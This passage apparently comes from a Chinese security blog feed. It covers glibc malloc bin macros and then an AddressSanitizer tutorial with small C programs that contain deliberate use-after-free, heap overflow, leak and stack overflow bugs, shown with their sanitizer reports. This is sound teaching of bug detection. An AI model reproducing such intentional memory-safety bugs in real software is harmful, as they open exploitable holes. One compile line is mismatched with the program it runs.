align="center">……</td><td align="center">……</td></tr><tr><td align="center"></td><td align="center">[0xC00 , 0xC40)</td><td align="center">96</td></tr><tr><td align="center"></td><td align="center">[0xC40 , 0xE00)</td><td align="center">97</td></tr><tr><td align="center">等差 0x200</td><td align="center">[0xE00 , 0x1000)</td><td align="center">98</td></tr><tr><td align="center"></td><td align="center">[0x1000 , 0x1200)</td><td align="center">99</td></tr><tr><td align="center"></td><td align="center">……</td><td align="center">……</td></tr><tr><td align="center"></td><td align="center">[0x2800 , 0x2A00)</td><td align="center">111</td></tr><tr><td align="center"></td><td align="center">[0x2A00 , 0x3000)</td><td align="center">112</td></tr><tr><td align="center">等差 0x1000</td><td align="center">[0x3000 , 0x4000)</td><td align="center">113</td></tr><tr><td align="center"></td><td align="center">[0x4000 , 0x5000)</td><td align="center">114</td></tr><tr><td align="center"></td><td align="center">……</td><td align="center">……</td></tr><tr><td align="center"></td><td align="center">[0x9000 , 0xA000)</td><td align="center">119</td></tr><tr><td align="center"></td><td align="center">[0xA000 , 0x10000)</td><td align="center">120</td></tr><tr><td align="center">等差 0x8000</td><td align="center">[0x10000 , 0x18000)</td><td align="center">121</td></tr><tr><td align="center"></td><td align="center">[0x18000 , 0x20000)</td><td align="center">122</td></tr><tr><td align="center"></td><td align="center">[0x20000 , 0x28000)</td><td align="center">123</td></tr><tr><td align="center">等差 0x18000</td><td align="center">[0x28000 , 0x40000)</td><td align="center">124</td></tr><tr><td align="center">等差 0x40000</td><td align="center">[0x40000 , 0x80000)</td><td align="center">125</td></tr><tr><td align="center"></td><td align="center">[0x80000 , …. )</td><td align="center">126</td></tr></tbody></table><h3 id="largebin-index-sz-宏"><a href="#largebin-index-sz-宏" class="headerlink" title="largebin_index(sz) 宏"></a>largebin_index(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index(sz) \</span></span><br><span class="line">  (SIZE_SZ == <span class="number">8</span> ? largebin_index_64 (sz)                                     \</span><br><span class="line">   : MALLOC_ALIGNMENT == <span class="number">16</span> ? largebin_index_32_big (sz)                     \</span><br><span class="line">   : largebin_index_32 (sz))</span><br></pre></td></tr></table></figure><p>用来指定 largebin 应该以哪一种方式来指定当前堆块大小所对应的下标</p><h3 id="bin-index-sz-宏"><a href="#bin-index-sz-宏" class="headerlink" title="bin_index(sz) 宏"></a>bin_index(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_index(sz) \</span></span><br><span class="line">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span><br></pre></td></tr></table></figure><p>判断当前堆块的大小是满足 smallbin 还是满足 largebin，然后去对应的宏里得到该堆块大小所对应的下标</p><h2 id="Unsorted-chunks"><a href="#Unsorted-chunks" class="headerlink" title="Unsorted chunks"></a>Unsorted chunks</h2><h3 id="unsorted-chunks-M"><a href="#unsorted-chunks-M" class="headerlink" title="unsorted_chunks(M)"></a>unsorted_chunks(M)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    All remainders from chunk splits, as well as all returned chunks,</span></span><br><span class="line"><span class="comment">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span></span><br><span class="line"><span class="comment">    in regular bins after malloc gives them ONE chance to be used before</span></span><br><span class="line"><span class="comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span></span><br><span class="line"><span class="comment">    with chunks being placed on it in free (and malloc_consolidate),</span></span><br><span class="line"><span class="comment">    and taken off (to be either used or placed in bins) in malloc.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span></span><br><span class="line"><span class="comment">    does not have to be taken into account in size comparisons.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span></span><br></pre></td></tr></table></figure><h2 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h2><h3 id="initial-top-M-宏"><a href="#initial-top-M-宏" class="headerlink" title="initial_top(M) 宏"></a>initial_top(M) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Top</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The top-most available chunk (i.e., the one bordering the end of</span></span><br><span class="line"><span class="comment">    available memory) is treated specially. It is never included in</span></span><br><span class="line"><span class="comment">    any bin, is used only if no other chunk is available, and is</span></span><br><span class="line"><span class="comment">    released back to the system if it is very large (see</span></span><br><span class="line"><span class="comment">    M_TRIM_THRESHOLD).  Because top initially</span></span><br><span class="line"><span class="comment">    points to its own bin with initial zero size, thus forcing</span></span><br><span class="line"><span class="comment">    extension on the first malloc request, we avoid having any special</span></span><br><span class="line"><span class="comment">    code in malloc to check whether it even exists yet. But we still</span></span><br><span class="line"><span class="comment">    need to do so when getting memory from system, so we make</span></span><br><span class="line"><span class="comment">    initial_top treat the bin as a legal but unusable chunk during the</span></span><br><span class="line"><span class="comment">    interval between initialization and the first call to</span></span><br><span class="line"><span class="comment">    sysmalloc. (This is somewhat delicate, since it relies on</span></span><br><span class="line"><span class="comment">    the 2 preceding words to be zero during this interval as well.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> initial_top(M)              (unsorted_chunks (M))</span></span><br></pre></td></tr></table></figure><h2 id="Binmap"><a href="#Binmap" class="headerlink" title="Binmap"></a>Binmap</h2><h3 id="BINMAPSHIFT-宏"><a href="#BINMAPSHIFT-宏" class="headerlink" title="BINMAPSHIFT 宏"></a>BINMAPSHIFT 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Binmap</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To help compensate for the large number of bins, a one-level index</span></span><br><span class="line"><span class="comment">    structure is used for bin-by-bin searching.  `binmap&#x27; is a</span></span><br><span class="line"><span class="comment">    bitvector recording whether bins are definitely empty so they can</span></span><br><span class="line"><span class="comment">    be skipped over during during traversals.  The bits are NOT always</span></span><br><span class="line"><span class="comment">    cleared as soon as bins are empty, but instead only</span></span><br><span class="line"><span class="comment">    when they are noticed to be empty during traversal in malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSHIFT      5</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/%E3%80%90Glibc%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%91Glibc%202.23%20--%20malloc.c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【ASAN】简单使用指南</title>
      <link>https://billyotry.github.io/2021/01/22/%E3%80%90ASAN%E3%80%91%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</link>
      <guid>https://billyotry.github.io/2021/01/22/%E3%80%90ASAN%E3%80%91%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</guid>
      <pubDate>Thu, 21 Jan 2021 16:59:43 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;以下内容仅为归纳，具体细节可自行测试。&lt;/p&gt;
&lt;h2 id=&quot;使用步骤&quot;&gt;&lt;a href=&quot;#使用步骤&quot; class=&quot;headerlink&quot; title=&quot;使用步骤&quot;&gt;&lt;/a&gt;使用步骤&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;用&lt;code&gt;-fsanitize=address&lt;/co
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>以下内容仅为归纳，具体细节可自行测试。</p><h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><ul><li>用<code>-fsanitize=address</code>选项编译和链接你的程序。</li><li>用<code>-fno-omit-frame-pointer</code>编译，以得到更容易理解stack trace。</li><li>可选择<code>-O1</code>或者更高的优化级别编译</li></ul><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">gcc -fsanitize=address -fno-omit-frame-pointer -O1 -g use-after-<span class="built_in">free</span>.c -o use-after-<span class="built_in">free</span></span><br></pre></td></tr></table></figure><p>如果发现错误，就会打印如下日志信息，如<code>UAF</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">4897</span>==ERROR: AddressSanitizer: heap-use-after-free <span class="keyword">on</span> address <span class="number">0x60200000eff0</span> at pc <span class="number">0x0000004009b6</span> bp <span class="number">0x7fff58399250</span> sp <span class="number">0x7fff58399240</span></span><br><span class="line">READ of size <span class="number">4</span> at <span class="number">0x60200000eff0</span> thread T0</span><br><span class="line">    <span class="meta">#0 0x4009b5 in main /home/c7/桌面/asan/use_after_free.c:14</span></span><br><span class="line">    <span class="meta">#1 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="meta">#2 0x400868 in _start (/home/c7/桌面/asan/use_after_free+0x400868)</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x60200000eff0</span> <span class="keyword">is</span> located <span class="number">0</span> bytes inside of <span class="number">4</span>-<span class="built_in">byte</span> region [<span class="number">0x60200000eff0</span>,<span class="number">0x60200000eff4</span>)</span><br><span class="line">freed <span class="keyword">by</span> thread T0 here:</span><br><span class="line">    <span class="meta">#0 0x7fd6cfd9d2ca in __interceptor_free (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x982ca)</span></span><br><span class="line">    <span class="meta">#1 0x40097e in main /home/c7/桌面/asan/use_after_free.c:13</span></span><br><span class="line">    <span class="meta">#2 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">previously allocated <span class="keyword">by</span> thread T0 here:</span><br><span class="line">    <span class="meta">#0 0x7fd6cfd9d602 in malloc (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x98602)</span></span><br><span class="line">    <span class="meta">#1 0x40094e in main /home/c7/桌面/asan/use_after_free.c:6</span></span><br><span class="line">    <span class="meta">#2 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-use-after-free /home/c7/桌面/asan/use_after_free.c:<span class="number">14</span> main</span><br></pre></td></tr></table></figure><ul><li>第一部分（ERROR）指出错误类型是heap-use-after-free；</li><li>第二部分（READ）, 指出线程名thread T0，操作为READ，发生的位置是use-after-free.c:14。</li><li>第三部分 (SUMMARY) 前面输出的概要说明。</li></ul><h2 id="编译选项"><a href="#编译选项" class="headerlink" title="编译选项"></a>编译选项</h2><h3 id="fsanitize-address"><a href="#fsanitize-address" class="headerlink" title="-fsanitize=address"></a>-fsanitize=address</h3><p>用户态内存错误检测，可以被环境变量ASAN_OPTIONS控制具体行为。</p><p><strong>use after free</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> * value = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="literal">NULL</span> == value)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;malloc failed\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(value);</span><br><span class="line">  <span class="keyword">return</span> *value;  <span class="comment">// use after free. BOOM!!!!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译链接</p><p><code>gcc -g -o use_after_free -fsanitize=address -lasan -fuse-ld=gold use_after_free.c</code></p><p><code>LD_PRELOAD=$&#123;LD_PRELOAD&#125;:/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so  ./use_after_free</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">4897</span>==ERROR: AddressSanitizer: heap-use-after-free <span class="keyword">on</span> address <span class="number">0x60200000eff0</span> at pc <span class="number">0x0000004009b6</span> bp <span class="number">0x7fff58399250</span> sp <span class="number">0x7fff58399240</span></span><br><span class="line">READ of size <span class="number">4</span> at <span class="number">0x60200000eff0</span> thread T0      <span class="comment">//访问释放后的内存</span></span><br><span class="line">    <span class="meta">#0 0x4009b5 in main /home/c7/桌面/asan/use_after_free.c:14</span></span><br><span class="line">    <span class="meta">#1 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="meta">#2 0x400868 in _start (/home/c7/桌面/asan/use_after_free+0x400868)</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x60200000eff0</span> <span class="keyword">is</span> located <span class="number">0</span> bytes inside of <span class="number">4</span>-<span class="built_in">byte</span> region [<span class="number">0x60200000eff0</span>,<span class="number">0x60200000eff4</span>)</span><br><span class="line">freed <span class="keyword">by</span> thread T0 here:        <span class="comment">//内存在哪里释放</span></span><br><span class="line">    <span class="meta">#0 0x7fd6cfd9d2ca in __interceptor_free (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x982ca)</span></span><br><span class="line">    <span class="meta">#1 0x40097e in main /home/c7/桌面/asan/use_after_free.c:13</span></span><br><span class="line">    <span class="meta">#2 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">previously allocated <span class="keyword">by</span> thread T0 here:         <span class="comment">//内存在哪里申请</span></span><br><span class="line">    <span class="meta">#0 0x7fd6cfd9d602 in malloc (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x98602)</span></span><br><span class="line">    <span class="meta">#1 0x40094e in main /home/c7/桌面/asan/use_after_free.c:6</span></span><br><span class="line">    <span class="meta">#2 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-use-after-free /home/c7/桌面/asan/use_after_free.c:<span class="number">14</span> main</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c047fff9da0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9db0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9dc0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9dd0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9de0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">=&gt;<span class="number">0x0c047fff9df0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa[fd]fa</span><br><span class="line">  <span class="number">0x0c047fff9e00</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e10</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e20</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e30</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e40</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line"><span class="function">Shadow <span class="built_in">byte</span> <span class="title">legend</span> (<span class="params">one shadow <span class="built_in">byte</span> represents <span class="number">8</span> application bytes</span>):</span></span><br><span class="line"><span class="function">  Addressable:           00</span></span><br><span class="line"><span class="function">  Partially addressable: 01 02 03 04 05 06 07 </span></span><br><span class="line"><span class="function">  Heap left redzone:       fa</span></span><br><span class="line"><span class="function">  Heap right redzone:      fb</span></span><br><span class="line"><span class="function">  Freed heap region:       fd</span></span><br><span class="line"><span class="function">  Stack left redzone:      f1</span></span><br><span class="line"><span class="function">  Stack mid redzone:       f2</span></span><br><span class="line"><span class="function">  Stack right redzone:     f3</span></span><br><span class="line"><span class="function">  Stack <span class="keyword">partial</span> redzone:   f4</span></span><br><span class="line"><span class="function">  Stack after <span class="keyword">return</span>:      f5</span></span><br><span class="line"><span class="function">  Stack use after scope:   f8</span></span><br><span class="line"><span class="function">  Global redzone:          f9</span></span><br><span class="line"><span class="function">  Global <span class="keyword">init</span> order:       f6</span></span><br><span class="line"><span class="function">  Poisoned <span class="keyword">by</span> user:        f7</span></span><br><span class="line"><span class="function">  Container overflow:      fc</span></span><br><span class="line"><span class="function">  Array cookie:            ac</span></span><br><span class="line"><span class="function">  Intra <span class="built_in">object</span> redzone:    bb</span></span><br><span class="line"><span class="function">  ASan <span class="keyword">internal</span>:           fe</span></span><br><span class="line"><span class="function"></span>==<span class="number">4897</span>==ABORTING</span><br></pre></td></tr></table></figure><p><strong>heap-buffer-overflow</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> * value = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="literal">NULL</span> == value)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;malloc failed\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> a= <span class="number">100</span>;</span><br><span class="line">  *((<span class="keyword">int</span>*)value) = a;  <span class="comment">// heap buffer overflow.  BOOM</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> *value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -o heap_buffer_overflow -fsanitize=address -lasan -fuse-ld=gold heap_buffer_overflow.c</code></p><p><code>LD_PRELOAD=$&#123;LD_PRELOAD&#125;:/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so  ./heap_buffer_overflow</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">4969</span>==ERROR: AddressSanitizer: heap-buffer-overflow <span class="keyword">on</span> address <span class="number">0x60200000eff0</span> at pc <span class="number">0x000000400971</span> bp <span class="number">0x7ffc34e7a150</span> sp <span class="number">0x7ffc34e7a140</span></span><br><span class="line">WRITE of size <span class="number">4</span> at <span class="number">0x60200000eff0</span> thread T0      <span class="comment">//这里内存越界</span></span><br><span class="line">    <span class="meta">#0 0x400970 in main /home/c7/桌面/asan/heap_buffer_overflow.c:13</span></span><br><span class="line">    <span class="meta">#1 0x7f817497183f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="meta">#2 0x400828 in _start (/home/c7/桌面/asan/heap_buffer_overflow+0x400828)</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x60200000eff1</span> <span class="keyword">is</span> located <span class="number">0</span> bytes to the right of <span class="number">1</span>-<span class="built_in">byte</span> region [<span class="number">0x60200000eff0</span>,<span class="number">0x60200000eff1</span>)</span><br><span class="line">allocated <span class="keyword">by</span> thread T0 here:</span><br><span class="line">    <span class="meta">#0 0x7f8174db3602 in malloc (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x98602)</span></span><br><span class="line">    <span class="meta">#1 0x40090e in main /home/c7/桌面/asan/heap_buffer_overflow.c:6</span></span><br><span class="line">    <span class="meta">#2 0x7f817497183f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /home/c7/桌面/asan/heap_buffer_overflow.c:<span class="number">13</span> main</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c047fff9da0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9db0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9dc0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9dd0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9de0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">=&gt;<span class="number">0x0c047fff9df0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa[<span class="number">01</span>]fa</span><br><span class="line">  <span class="number">0x0c047fff9e00</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e10</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e20</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e30</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e40</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line"><span class="function">Shadow <span class="built_in">byte</span> <span class="title">legend</span> (<span class="params">one shadow <span class="built_in">byte</span> represents <span class="number">8</span> application bytes</span>):</span></span><br><span class="line"><span class="function">  Addressable:           00</span></span><br><span class="line"><span class="function">  Partially addressable: 01 02 03 04 05 06 07 </span></span><br><span class="line"><span class="function">  Heap left redzone:       fa</span></span><br><span class="line"><span class="function">  Heap right redzone:      fb</span></span><br><span class="line"><span class="function">  Freed heap region:       fd</span></span><br><span class="line"><span class="function">  Stack left redzone:      f1</span></span><br><span class="line"><span class="function">  Stack mid redzone:       f2</span></span><br><span class="line"><span class="function">  Stack right redzone:     f3</span></span><br><span class="line"><span class="function">  Stack <span class="keyword">partial</span> redzone:   f4</span></span><br><span class="line"><span class="function">  Stack after <span class="keyword">return</span>:      f5</span></span><br><span class="line"><span class="function">  Stack use after scope:   f8</span></span><br><span class="line"><span class="function">  Global redzone:          f9</span></span><br><span class="line"><span class="function">  Global <span class="keyword">init</span> order:       f6</span></span><br><span class="line"><span class="function">  Poisoned <span class="keyword">by</span> user:        f7</span></span><br><span class="line"><span class="function">  Container overflow:      fc</span></span><br><span class="line"><span class="function">  Array cookie:            ac</span></span><br><span class="line"><span class="function">  Intra <span class="built_in">object</span> redzone:    bb</span></span><br><span class="line"><span class="function">  ASan <span class="keyword">internal</span>:           fe</span></span><br><span class="line"><span class="function"></span>==<span class="number">4969</span>==ABORTING</span><br></pre></td></tr></table></figure><p><strong>memory leak</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  p = <span class="built_in">malloc</span>(<span class="number">7</span>);</span><br><span class="line">  p = <span class="number">0</span>; <span class="comment">// The memory is leaked here.</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -o memory_leak -fsanitize=address -lasan -fuse-ld=gold memory_leak.c</code></p><p><code>LD_PRELOAD=$&#123;LD_PRELOAD&#125;:/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so   ./memory_leak</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">5014</span>==ERROR: LeakSanitizer: detected memory leaks</span><br><span class="line"></span><br><span class="line">Direct leak of <span class="number">7</span> <span class="built_in">byte</span>(s) <span class="keyword">in</span> <span class="number">1</span> <span class="built_in">object</span>(s) allocated <span class="keyword">from</span>:</span><br><span class="line">    <span class="meta">#0 0x7f3e3f381602 in malloc (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x98602)</span></span><br><span class="line">    <span class="meta">#1 0x400703 in main /home/c7/桌面/asan/memory_leak.c:6</span></span><br><span class="line">    <span class="meta">#2 0x7f3e3ef3f83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: <span class="number">7</span> <span class="built_in">byte</span>(s) leaked <span class="keyword">in</span> <span class="number">1</span> allocation(s).</span><br></pre></td></tr></table></figure><h3 id="Stack-buffer-overflow"><a href="#Stack-buffer-overflow" class="headerlink" title="Stack-buffer-overflow"></a>Stack-buffer-overflow</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> stack_array[<span class="number">100</span>];</span><br><span class="line">  stack_array[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> stack_array[argc + <span class="number">100</span>];  <span class="comment">// BOOM</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -o memory_leak -fsanitize=address -lasan -fuse-ld=gold memory_leak.c</code></p><p><code>LD_PRELOAD=$&#123;LD_PRELOAD&#125;:/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so   ./stack_overflow</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">5077</span>==ERROR: AddressSanitizer: stack-buffer-overflow <span class="keyword">on</span> address <span class="number">0x7ffe67846ad4</span> at pc <span class="number">0x000000400916</span> bp <span class="number">0x7ffe67846900</span> sp <span class="number">0x7ffe678468f0</span></span><br><span class="line">READ of size <span class="number">4</span> at <span class="number">0x7ffe67846ad4</span> thread T0</span><br><span class="line">    <span class="meta">#0 0x400915 in main /home/c7/桌面/asan/stack_overflow.c:4</span></span><br><span class="line">    <span class="meta">#1 0x7fd65942183f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="meta">#2 0x400758 in _start (/home/c7/桌面/asan/stack_overflow+0x400758)</span></span><br><span class="line"></span><br><span class="line">Address <span class="number">0x7ffe67846ad4</span> <span class="keyword">is</span> located <span class="keyword">in</span> stack of thread T0 at offset <span class="number">436</span> <span class="keyword">in</span> frame</span><br><span class="line">    <span class="meta">#0 0x400835 in main /home/c7/桌面/asan/stack_overflow.c:1</span></span><br><span class="line"></span><br><span class="line">  This frame has <span class="number">1</span> <span class="built_in">object</span>(s):</span><br><span class="line">    [<span class="meta">32, 432) &#x27;stack_array&#x27; &lt;== Memory access at offset 436 overflows this variable</span></span><br><span class="line"><span class="meta">HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext</span></span><br><span class="line"><span class="meta">      (longjmp and C++ exceptions *are* supported)</span></span><br><span class="line"><span class="meta">SUMMARY: AddressSanitizer: stack-buffer-overflow /home/c7/桌面/asan/stack_overflow.c:4 main</span></span><br><span class="line"><span class="meta">Shadow bytes around the buggy address:</span></span><br><span class="line"><span class="meta">  0x10004cf00d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="meta">  0x10004cf00d10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="meta">  0x10004cf00d20: 00 00 00 00 f1 f1 f1 f1 00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="meta">  0x10004cf00d30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 